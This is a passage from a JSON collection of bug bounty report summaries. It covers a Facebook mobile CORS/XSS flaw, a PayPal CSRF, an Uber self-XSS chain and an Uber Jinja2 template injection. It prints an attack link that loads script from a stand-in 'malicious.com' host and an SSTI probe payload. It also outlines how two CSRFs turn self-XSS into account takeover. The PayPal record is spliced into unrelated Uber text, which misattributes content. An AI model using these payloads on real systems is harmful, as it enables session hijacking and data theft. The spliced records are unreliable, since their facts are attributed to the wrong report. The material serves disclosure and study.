The mobile interface dynamically loaded URLs via AJAX based on the window hash, and failed to restrict these URLs to Facebook-owned domains. As a result, attackers could inject external URLs that were loaded and executed client-side due to CORS, enabling cross-site scripting (XSS). This allowed attackers to run arbitrary JavaScript in a user's session, potentially exposing private data, sending messages, or escalating privileges. The vulnerability was client-side and left no server traces. Once reported, Facebook fixed the issue within a day by implementing client-side URL origin validation.\n\nKey points:\n- The bug exploited HTML5 CORS combined with unsafe dynamic AJAX content loading.\n- Attackers could craft links like `http://touch.facebook.com/#http://malicious.com/exploit.js`.\n- Malicious scripts could control the user's session and interact with Facebook on the user's behalf.\n- The underlying issue was not validating URL origins in JavaScript, an example of weak business logic in new web technology adoption.\n\n_This summary was partly generated by AI_\n","references":["https://maustin.net/articles/2010-07/facebook_html5"],"tags":["business-logic","api","cors","xss","client-side","html5","validation"],"bounty":"Unspecified","program":"Facebook"},{"id":"20121012-paypal-CSRF","target":"Paypal","date":"2012-10-12","path":"/reports/20121012-paypal-CSRF/","title":"No CSRF token present in Customer service message form.","reported_platform":"Bugcrowd","bug_type":"CSRF","severity":"Medium","report_url":"https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/","summary":"A CSRF vulnerability exists in PayPal’s “Customer Service Message” form, which allows sellers to configure a personalized message\nshown to customers when they open a dispute.

On its own, this only impacted the user's own account, as the field was only visible to them.\nHowever, by chaining two Cross-Site Request Forgery (CSRF) vulnerabilities in the OAuth login and logout flows, the researcher escalated the self-XSS to target any user. The attack involved: - Forcing a victim to log out of their Uber Partners session but not their OAuth session (via CSP tricks), - Logging the victim into the attacker's account (so stored XSS payload executes), - Then automatically logging the victim back into their own account, with the attacker's code running in a privileged context.\nThis allowed the attacker to execute scripted actions on behalf of the victim. Notably, this chain demonstrated how self-XSS, often initially dismissed as low-impact, can lead to full account compromise when combined with business logic flaws in authentication and session management. The combination implicated real-world risk for session hijacking and data exfiltration.\nKey points: - Initial self-XSS in the user profile field. - Two minor CSRFs in OAuth login/logout flow allow complete attack automation. - Session switching and CSP tricks bypass normal defensive controls.\n_This summary was partly generated by AI_","references":["https://whitton.io/articles/uber-turning-self-xss-into-good-xss/"],"tags":["xss","self-xss","csrf","oauth","session-management","csp","authentication"],"bounty":"Unspecified","program":"uber"},{"id":"20160325-uber-SSTI","target":"uber","date":"2016-03-25","path":"/reports/20160325-uber-SSTI/","title":"uber.com may RCE by Flask Jinja2 Template Injection","reported_platform":"hackerone","bug_type":"SSTI","severity":"Critical","report_url":"https://hackerone.com/reports/125980","summary":"The researcher found a SSTI vulnerability in `rider.uber.com`, the vulnerability exists in the 'change your account information' feature, where it sends an email about the update.\nif the updated username was a template payload `{{7*7}}`, it executed and showed up as 49 in the update email.
